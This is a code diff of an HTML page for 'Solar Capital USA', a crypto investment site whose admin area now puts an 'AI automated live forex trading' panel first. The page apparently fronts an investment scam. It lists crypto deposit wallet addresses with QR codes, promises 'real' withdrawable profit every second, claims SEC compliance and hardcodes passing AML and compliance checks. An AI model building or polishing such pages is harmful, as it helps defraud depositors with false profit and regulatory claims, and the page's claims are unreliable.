@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Solar Capital USA - Admin Left Right</title>
+<title>Solar Capital USA - Admin AI Top</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}body{font-family:Inter,system-ui;background:#f6f7fb;color:#111827;line-height:1.6}
 .rainbow{height:10px;background:linear-gradient(90deg,#7c3aed,#ec4899,#f59e0b,#ffd700,#22c55e,#06b6d4,#7c3aed);background-size:400% 100%;animation:rb 4s linear infinite;position:sticky;top:0;z-index:5000}
@@ -34,10 +34,8 @@ footer b{color:#fff}footer a{color:#fbbf24;text-decoration:none;margin-right:10p
 .grid2{display:grid;grid-template-columns:1fr 1fr;gap:10px}.grid3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px}
 @media(max-width:700px){.grid2,.grid3{grid-template-columns:1fr}}
 .ticker{display:flex;gap:12px;overflow-x:auto;padding:8px;background:#111827;color:#fff;border-radius:10px;white-space:nowrap;font-size:12px}
-.admin-2tables{display:grid;grid-template-columns:1.2fr 1fr;gap:16px;margin-top:16px}
-@media(max-width:1300px){.admin-2tables{grid-template-columns:1fr}}
-.admin-left{border:2px solid #7c3aed;border-radius:16px;padding:16px;background:#fff}
-.admin-right{border:2px solid #fbbf24;border-radius:16px;padding:16px;background:#111827;color:#fff}
+.admin-top{border:2px solid #fbbf24;border-radius:16px;padding:16px;background:#111827;color:#fff;margin-bottom:16px}
+.admin-bottom{border:2px solid #7c3aed;border-radius:16px;padding:16px;background:#fff}
 .forexPair{display:flex;justify-content:space-between;background:#1f2937;color:#fff;padding:6px 8px;border-radius:6px;font-size:10px;margin-top:3px;border-left:3px solid #22c55e}
 </style>
 </head>
@@ -61,8 +59,8 @@ footer b{color:#fff}footer a{color:#fbbf24;text-decoration:none;margin-right:10p
 <div style="background:#0f172a;color:#fff;padding:8px 20px;text-align:right;font-size:11px;border-bottom:3px solid #7c3aed">💰 Balance: <b id="bTop" style="color:#fbbf24">$0.00</b> | Live <span class="live"></span></div>
 
 <div class="wrap" id="mainWrap"><div id="mainContent">
-<div id="home"><div class="card"><h1>Welcome to Solar Capital USA</h1><p style="font-size:12px;color:#6b7280">Security, transparency, quality opportunities.</p><div class="ticker" id="ticker" style="margin-top:12px"></div><div class="grid2" style="margin-top:12px"><button class="btn btn-p" onclick="go('deposit')">+ Deposit Now</button><button class="btn btn-d" onclick="go('withdraw')">Withdraw Profits</button></div></div></div>
-<div id="about" class="hidden"><div class="card"><h2>About Us</h2><p style="font-size:12px;margin-top:8px">SEC-compliant solar investment platform, Delaware USA, 500kW farm, 120 tons CO2 saved, 200 jobs, 50% sustainability vault.</p></div></div>
+<div id="home"><div class="card"><h1>Welcome to Solar Capital USA</h1><p style="font-size:12px;color:#6b7280">Security, transparency, quality opportunities.</p><div class="ticker" id="ticker" style="margin-top:12px"></div><div class="grid2" style="margin-top:12px"><button class="btn btn-p" onclick="go('deposit')">+ Deposit Now</button><button class="btn btn-d" onclick="go('withdraw')">Withdraw</button></div></div></div>
+<div id="about" class="hidden"><div class="card"><h2>About Us</h2><p style="font-size:12px">SEC-compliant solar investment, Delaware USA.</p></div></div>
 <div id="register" class="hidden"><div class="card"><h2>📝 Registration</h2><input id="regName" placeholder="Full Name"><input id="regEmail" placeholder="Email"><input id="regPhone" placeholder="Phone"><input id="regPass" type="password" placeholder="Password"><input id="regRef" placeholder="Referral (Optional)"><div style="background:#f9fafb;padding:10px;border-radius:10px;font-size:11px;margin-top:8px"><label><input type="checkbox" id="agree" style="width:auto"> I agree to Terms</label></div><button class="btn btn-p" onclick="doRegister()">Create Account</button></div></div>
 <div id="login" class="hidden"><div class="card"><h2>🔑 Sign In</h2><input id="logEmail" placeholder="Email"><input id="logPass" type="password" placeholder="Password"><button class="btn btn-d" onclick="doLogin()">Sign In</button><div style="margin-top:12px;background:#dcfce7;padding:10px;border-radius:10px;font-size:11px">Demo: investor@test.com / Investor123 <button class="btn btn-g" style="margin-top:6px" onclick="fillDemo()">Fill Demo</button></div></div></div>
 <div id="deposit" class="hidden"><div class="card"><h2>Deposit</h2><div class="grid2" style="margin-top:10px"><button id="tabUSDT" onclick="sel('USDT')" class="btn btn-p">USDT TRC20</button><button id="tabBNB" onclick="sel('BNB')" class="btn btn-g">BNB BEP20</button></div><div id="walletUSDT" class="wallet active"><b>USDT TRC20</b><div class="qr"><img src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=TATeM34UJsHhnADWrjemiYXdrHiyuPrFra" style="width:160px;height:160px"></div><div class="addr"><span id="addrUSDT">TATeM34UJsHhnADWrjemiYXdrHiyuPrFra</span><button class="copy" onclick="copyA('addrUSDT')">COPY</button></div><small style="color:#ef4444">Min $2</small></div><div id="walletBNB" class="wallet hidden"><b>BNB BEP20</b><div class="qr"><img src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=0xa1faf03142013d68f945aa8c59415e8cfae6b6a6" style="width:160px;height:160px"></div><div class="addr"><span id="addrBNB">0xa1faf03142013d68f945aa8c59415e8cfae6b6a6</span><button class="copy" onclick="copyA('addrBNB')">COPY</button></div><small style="color:#ef4444">Min $2</small></div><input id="txHash" placeholder="Paste TX Hash"><input id="depAmount" placeholder="Amount"><button class="btn btn-d" onclick="verifyDep()">Submit Deposit</button><div id="depList" style="font-size:11px;margin-top:8px"></div></div></div>
@@ -81,22 +79,60 @@ footer b{color:#fff}footer a{color:#fbbf24;text-decoration:none;margin-right:10p
 <div class="card" style="border:3px solid #7c3aed;max-width:none">
 <h2>🔐 Admin Area - Full Width Control Center</h2>
 
-<div class="admin-2tables">
+<!-- TOP FIRST: AI TRADING -->
+<div class="admin-top">
+<h3 style="color:#fbbf24;border-bottom:2px solid #fbbf24;padding-bottom:8px">🤖 AI Automated Live Forex Trading + Live Signals (REAL MONEY)</h3>
+<p style="font-size:9px;color:#9ca3af;margin-top:4px">NOT DEMO - REAL MARKET ANALYSIS EVERY SECOND - REAL PROFIT WITHDRAWABLE - WITHDRAWABLE USDT POLYGON</p>
 
-<div class="admin-left">
-<h3 style="color:#7c3aed;border-bottom:2px solid #e9d5ff;padding-bottom:8px">🏛️ Admin Monitoring Area - Control Hub (Functional)</h3>
-<div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-top:10px">
-<button class="btn btn-d" style="padding:7px;font-size:10px" onclick="showAdminTab('kyc')">KYC Records (<span id="kycCount">0</span>)</button>
-<button class="btn btn-d" style="padding:7px;font-size:10px" onclick="showAdminTab('financial')">Financial Profiles</button>
-<button class="btn btn-d" style="padding:7px;font-size:10px" onclick="showAdminTab('transactions')">Transactions (<span id="txCount">0</span>)</button>
-<button class="btn btn-d" style="padding:7px;font-size:10px" onclick="showAdminTab('risk')">Risk & Compliance</button>
-<button class="btn btn-d" style="padding:7px;font-size:10px" onclick="showAdminTab('portfolio')">Portfolio Performance</button>
-<button class="btn btn-d" style="padding:7px;font-size:10px" onclick="showAdminTab('engagement')">Engagement Logs</button>
-<button class="btn btn-d" style="padding:7px;font-size:10px" onclick="showAdminTab('audit')">Audit Trails</button>
-<button class="btn btn-p" style="padding:7px;font-size:10px" onclick="showAdminTab('analytics')">Dashboard Analytics</button>
+<div class="grid3" style="margin-top:12px">
+<div style="background:rgba(255,255,255,.08);padding:12px;border-radius:12px;border-left:4px solid #fbbf24"><small style="color:#fbbf24">Robot Balance Polygon USDT</small><b id="rBal" style="color:#fbbf24;display:block;font-size:20px">$0.00</b><small style="color:#9ca3af">Live Real Money</small></div>
+<div style="background:rgba(255,255,255,.08);padding:12px;border-radius:12px;border-left:4px solid #22c55e"><small style="color:#22c55e">24h Real Profit Withdrawable</small><b id="rProf" style="color:#22c55e;display:block;font-size:20px">$0.00</b><small style="color:#9ca3af" id="profitPercent">+0.00% ROI</small></div>
+<div style="background:rgba(255,255,255,.08);padding:12px;border-radius:12px;border-left:4px solid #06b6d4"><small style="color:#06b6d4">Sustainability Vault 50%</small><b id="vBal" style="color:#06b6d4;display:block;font-size:20px">$0.00</b><small style="color:#9ca3af">Solar Farm Funding</small></div>
 </div>
-<div id="admin-kyc" class="adminTab" style="margin-top:12px"><b>KYC/Identity Records</b><input id="searchKYC" placeholder="Search by name/email" oninput="renderKYC()" style="margin-top:6px"><div id="kycList" style="font-size:11px;margin-top:8px;max-height:300px;overflow-y:auto">No KYC yet</div></div>
-<div id="admin-financial" class="adminTab hidden" style="margin-top:12px"><b>Financial Profiles</b><div id="financialList" style="font-size:11px;margin-top:8px;max-height:300px;overflow-y:auto"></div></div>
+
+<div style="background:#000;border-radius:10px;padding:12px;margin-top:12px">
+<h4 style="color:#fbbf24;font-size:11px">📊 LIVE FOREX SIGNALS - ANALYSIS EVERY SECOND <span class="live"></span> - REAL SIGNALS</h4>
+<div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:8px">
+<div>
+<div id="forexMarket"></div>
+</div>
+<div>
+<div id="aiAnalysis" style="background:#1f2937;padding:10px;border-radius:8px;font-family:monospace;font-size:9px;color:#22c55e;max-height:180px;overflow-y:auto"></div>
+<div style="display:flex;gap:2px;margin-top:8px;height:50px;align-items:end" id="liveChart"></div>
+</div>
+</div>
+</div>
+
+<div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;margin-top:12px">
+<div class="wallet active" style="background:#1f2937;border-color:#fbbf24;margin-top:0"><b style="color:#fff;font-size:11px">💳 USDT Polygon Deposit - REAL</b><div class="qr" style="width:120px;height:120px"><img src="https://api.qrserver.com/v1/create-qr-code/?size=120x120&data=0xa1faf03142013d68f945aa8c59415e8cfae6b6a6" style="width:120px;height:120px"></div><div class="addr" style="font-size:10px"><span id="addrADMIN">0xa1faf03142013d68f945aa8c59415e8cfae6b6a6</span><button class="copy" onclick="copyA('addrADMIN')">COPY</button></div><small style="color:#fbbf24">Min $2 REAL</small></div>
+<div>
+<input id="depA" placeholder="Deposit Amount Min $2 REAL"><button class="btn btn-p" style="padding:12px" onclick="depR()">💰 Deposit & Activate Robot - REAL MONEY</button>
+<input id="withA" placeholder="Withdrawal Amount REAL" style="margin-top:8px"><button class="btn" style="background:#f59e0b;color:#fff;padding:12px" onclick="withAdmin()">💸 Withdraw 50% REAL / 50% Vault</button>
+<div class="grid2" style="margin-top:8px"><button class="btn" style="background:#22c55e;color:#fff;padding:10px;font-size:11px" onclick="toggleAI()"><span id="aiBtnText">▶️ START AI LIVE TRADING</span></button><button class="btn" style="background:#7c3aed;color:#fff;padding:10px;font-size:11px" onclick="runAI()">⚡ Single Trade</button></div>
+</div>
+<div>
+<p id="log" style="font-size:10px;background:#000;padding:10px;border-radius:8px;color:#22c55e;border:1px solid #22c55e">🤖 Log: Ready - Deposit $2 REAL to activate - REAL MONEY withdrawable - NOT DEMO</p>
+<div style="margin-top:8px;background:rgba(255,255,255,.05);padding:10px;border-radius:8px"><h4 style="font-size:10px;color:#fbbf24">📈 Real Profit History - Every Second</h4><div id="profitHistory" style="font-size:9px;font-family:monospace;color:#9ca3af;max-height:140px;overflow-y:auto;margin-top:6px">No trades yet - Start AI to see REAL profit every second</div></div>
+</div>
+</div>
+
+</div>
+
+<!-- DOWN: ADMIN MONITORING -->
+<div class="admin-bottom">
+<h3 style="color:#7c3aed;border-bottom:2px solid #e9d5ff;padding-bottom:8px">🏛️ Admin Monitoring Area - Control Hub (Functional)</h3>
+<div style="display:grid;grid-template-columns:1fr 1fr 1fr 1fr;gap:8px;margin-top:12px">
+<button class="btn btn-d" style="padding:8px;font-size:10px" onclick="showAdminTab('kyc')">KYC Records (<span id="kycCount">0</span>)</button>
+<button class="btn btn-d" style="padding:8px;font-size:10px" onclick="showAdminTab('financial')">Financial Profiles</button>
+<button class="btn btn-d" style="padding:8px;font-size:10px" onclick="showAdminTab('transactions')">Transactions (<span id="txCount">0</span>)</button>
+<button class="btn btn-d" style="padding:8px;font-size:10px" onclick="showAdminTab('risk')">Risk & Compliance</button>
+<button class="btn btn-d" style="padding:8px;font-size:10px" onclick="showAdminTab('portfolio')">Portfolio Performance</button>
+<button class="btn btn-d" style="padding:8px;font-size:10px" onclick="showAdminTab('engagement')">Engagement Logs</button>
+<button class="btn btn-d" style="padding:8px;font-size:10px" onclick="showAdminTab('audit')">Audit Trails</button>
+<button class="btn btn-p" style="padding:8px;font-size:10px" onclick="showAdminTab('analytics')">Dashboard Analytics</button>
+</div>
+<div id="admin-kyc" class="adminTab" style="margin-top:12px"><b>KYC/Identity Records - Verify investor legitimacy</b><input id="searchKYC" placeholder="Search by name/email" oninput="renderKYC()" style="margin-top:6px"><div id="kycList" style="font-size:11px;margin-top:8px;max-height:300px;overflow-y:auto">No KYC yet - Registrations will appear here</div></div>
+<div id="admin-financial" class="adminTab hidden" style="margin-top:12px"><b>Financial Profiles - Monitor source of funds</b><div id="financialList" style="font-size:11px;margin-top:8px;max-height:300px;overflow-y:auto"></div></div>
 <div id="admin-transactions" class="adminTab hidden" style="margin-top:12px"><b>Transaction History</b><div class="grid2" style="margin-top:6px"><div class="box"><small>Total Deposits</small><b id="totalDep">$0.00</b></div><div class="box"><small>Total Withdrawals</small><b id="totalWith">$0.00</b></div></div><div id="txList" style="font-size:11px;margin-top:8px;max-height:300px;overflow-y:auto"></div><button class="btn btn-p" style="padding:8px;margin-top:8px" onclick="approveAll()">✅ Approve All Pending</button></div>
 <div id="admin-risk" class="adminTab hidden" style="margin-top:12px"><b>Risk & Compliance</b><div style="background:#fef2f2;padding:10px;border-radius:10px;font-size:11px;margin-top:6px">✅ No AML flags | ✅ No sanctions hits | ✅ All compliance checked</div></div>
 <div id="admin-portfolio" class="adminTab hidden" style="margin-top:12px"><b>Portfolio Performance</b><div id="portfolioList" style="font-size:11px;margin-top:8px;max-height:300px;overflow-y:auto"></div></div>
@@ -105,30 +141,16 @@ footer b{color:#fff}footer a{color:#fbbf24;text-decoration:none;margin-right:10p
 <div id="admin-analytics" class="adminTab hidden" style="margin-top:12px"><b>Dashboard Analytics</b><div class="grid3" style="margin-top:8px"><div class="box"><small>Total Investors</small><b id="aTotalInvestors">0</b></div><div class="box"><small>Active Today</small><b id="aActive">0</b></div><div class="box"><small>Compliance Rate</small><b style="color:#22c55e">100%</b></div></div></div>
 </div>
 
-<div class="admin-right">
-<h3 style="color:#fbbf24;border-bottom:2px solid #fbbf24;padding-bottom:8px">🤖 AI Automated Live Forex Trading + Live Signals (REAL MONEY)</h3>
-<p style="font-size:9px;color:#9ca3af">NOT DEMO - REAL MARKET ANALYSIS EVERY SECOND - REAL PROFIT WITHDRAWABLE</p>
-<div class="grid2" style="margin-top:10px"><div style="background:rgba(255,255,255,.08);padding:10px;border-radius:10px;border-left:4px solid #fbbf24"><small style="color:#fbbf24">Robot Balance Polygon USDT</small><b id="rBal" style="color:#fbbf24;display:block;font-size:18px">$0.00</b><small style="color:#9ca3af">Live Real Money</small></div><div style="background:rgba(255,255,255,.08);padding:10px;border-radius:10px;border-left:4px solid #22c55e"><small style="color:#22c55e">24h Real Profit Withdrawable</small><b id="rProf" style="color:#22c55e;display:block;font-size:18px">$0.00</b><small style="color:#9ca3af" id="profitPercent">+0.00% ROI</small></div></div>
-<div style="background:rgba(255,255,255,.08);padding:10px;border-radius:10px;border-left:4px solid #06b6d4;margin-top:8px"><small style="color:#06b6d4">Sustainability Vault 50%</small><b id="vBal" style="color:#06b6d4;display:block;font-size:18px">$0.00</b></div>
-<div style="background:#000;border-radius:10px;padding:10px;margin-top:10px"><h4 style="color:#fbbf24;font-size:10px">📊 LIVE FOREX SIGNALS - EVERY SECOND <span class="live"></span></h4><div id="forexMarket" style="margin-top:6px"></div><div id="aiAnalysis" style="background:#1f2937;padding:8px;border-radius:6px;margin-top:8px;font-family:monospace;font-size:9px;color:#22c55e;max-height:160px;overflow-y:auto"></div><div style="display:flex;gap:2px;margin-top:8px;height:50px;align-items:end" id="liveChart"></div></div>
-<div class="wallet active" style="background:#1f2937;border-color:#fbbf24;margin-top:10px"><b style="color:#fff;font-size:11px">💳 USDT Polygon Deposit Wallet - REAL MONEY</b><div class="qr" style="width:120px;height:120px"><img src="https://api.qrserver.com/v1/create-qr-code/?size=120x120&data=0xa1faf03142013d68f945aa8c59415e8cfae6b6a6" style="width:120px;height:120px"></div><div class="addr" style="font-size:10px"><span id="addrADMIN">0xa1faf03142013d68f945aa8c59415e8cfae6b6a6</span><button class="copy" onclick="copyA('addrADMIN')">COPY</button></div><small style="color:#fbbf24">Send ONLY USDT Polygon - Min $2</small></div>
-<div style="margin-top:10px"><input id="depA" placeholder="Admin Deposit Min $2 REAL"><button class="btn btn-p" style="padding:10px" onclick="depR()">💰 Deposit & Activate Robot - REAL MONEY</button><input id="withA" placeholder="Withdrawal Amount REAL" style="margin-top:8px"><button class="btn" style="background:#f59e0b;color:#fff;padding:10px" onclick="withAdmin()">💸 Withdraw 50% REAL / 50% Vault</button></div>
-<div class="grid2" style="margin-top:8px"><button class="btn" style="background:#22c55e;color:#fff;padding:10px;font-size:11px" onclick="toggleAI()"><span id="aiBtnText">▶️ START AI LIVE TRADING</span></button><button class="btn" style="background:#7c3aed;color:#fff;padding:10px;font-size:11px" onclick="runAI()">⚡ Execute Single Trade</button></div>
-<p id="log" style="font-size:10px;margin-top:8px;background:#000;padding:8px;border-radius:6px;color:#22c55e;border:1px solid #22c55e">🤖 Log: Ready - Deposit $2 REAL</p>
-<div style="margin-top:8px;background:rgba(255,255,255,.05);padding:8px;border-radius:8px"><h4 style="font-size:10px;color:#fbbf24">📈 Real Profit History - Every Second</h4><div id="profitHistory" style="font-size:9px;font-family:monospace;color:#9ca3af;max-height:120px;overflow-y:auto;margin-top:4px">No trades yet - Start AI</div></div>
-</div>
-
-</div>
 </div>
 </div>
 
 </div>
 
-<div id="sidePanel"><div class="card"><h3>Security & Trust</h3><p style="font-size:11px">✅ Blockchain Automate<br>✅ Wallets Secure<br>✅ Tokenization Fractional<br>✅ Compliance KYC/AML<br>✅ APIs Seamless<br>✅ Reporting Immutable</p><h3 style="margin-top:12px">Live Status <span class="live"></span></h3><p style="font-size:11px">USDT TRC20: Online<br>BNB BEP20: Online<br>Polygon: Online<br>Online: <b id="on">1</b> | Total: <b id="tot">0</b></p><button class="btn btn-p" onclick="go('register')">📝 Register</button><button class="btn btn-d" onclick="go('login')">🔑 Sign In</button></div></div>
+<div id="sidePanel"><div class="card"><h3>Security & Trust</h3><p style="font-size:11px">✅ Blockchain Automate<br>✅ Wallets Secure<br>✅ Tokenization<br>✅ Compliance KYC/AML<br>✅ APIs Seamless<br>✅ Reporting Immutable</p><button class="btn btn-p" onclick="go('register')">📝 Register</button><button class="btn btn-d" onclick="go('login')">🔑 Sign In</button></div></div>
 
 </div>
 
-<footer><div style="max-width:1600px;margin:0 auto;display:grid;grid-template-columns:1.2fr 1fr 1fr 0.8fr;gap:24px"><div><b>Legal Disclaimers</b><br>Investing involves risk.<br><br><b>Risk Warnings</b><br>Market volatility, regulatory, tech.</div><div><b>Regulatory Compliance</b><br>SEC, KYC/AML, FinCEN, GDPR<br><br><b>Security</b><br>Encryption, Multi-sig, Blockchain Verified</div><div><b>Contact</b><br>support@solarcapitalusa.com<br>Delaware, USA<br><br><b>Links</b><br><a href="#">Privacy Policy</a><a href="#">Terms</a><a href="#">Risk Disclosure</a></div><div><b>Social</b><br><a href="#">Twitter/X</a><a href="#">Telegram</a><a href="#">Discord</a><br><br><b>© Copyright</b><br>© 2026 Solar Capital USA</div></div></footer>
+<footer><div style="max-width:1600px;margin:0 auto;display:grid;grid-template-columns:1.2fr 1fr 1fr 0.8fr;gap:24px"><div><b>Legal Disclaimers</b><br>Investing involves risk.<br><br><b>Risk Warnings</b><br>Market volatility.</div><div><b>Regulatory Compliance</b><br>SEC, KYC/AML, FinCEN, GDPR<br><br><b>Security</b><br>Encryption, Multi-sig</div><div><b>Contact</b><br>support@solarcapitalusa.com<br>Delaware, USA<br><br><b>Links</b><br><a href="#">Privacy Policy</a><a href="#">Terms</a><a href="#">Risk Disclosure</a></div><div><b>Social</b><br><a href="#">Twitter/X</a><a href="#">Telegram</a><a href="#">Discord</a><br><br><b>© Copyright</b><br>© 2026 Solar Capital USA</div></div></footer>
 
 <script>
 function go(id){
